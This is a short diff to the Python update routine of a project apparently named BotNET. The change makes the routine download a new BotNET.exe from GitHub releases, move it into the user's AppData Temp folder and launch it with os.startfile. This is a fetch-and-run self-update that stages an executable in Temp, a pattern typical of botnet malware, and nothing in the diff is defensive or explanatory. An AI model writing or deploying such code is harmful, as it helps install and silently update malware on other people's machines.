@@ -2,6 +2,8 @@ import requests
 import os
 import re
 import bs4
+import shutil
+import getpass
 import urllib
 
 values = []
@@ -27,7 +29,9 @@ def update(current_ver):
     if (version > current_ver):
         url = 'https://github.com/Reedus0/BotNET/releases/download/%s/BotNET.exe' % version
         urllib.request.urlretrieve(url, "lastnet.exe")
-        os.system("lastnet.exe")
+        shutil.move("lastnet.exe", "D:\\Users\\%s\\AppData\\Local\\Temp\\lastnet.exe" % getpass.getuser())
+        os.startfile("D:\\Users\\%s\\AppData\\Local\\Temp\\lastnet.exe" % getpass.getuser())
+        status = 1
     else:
         status = 0
         pass
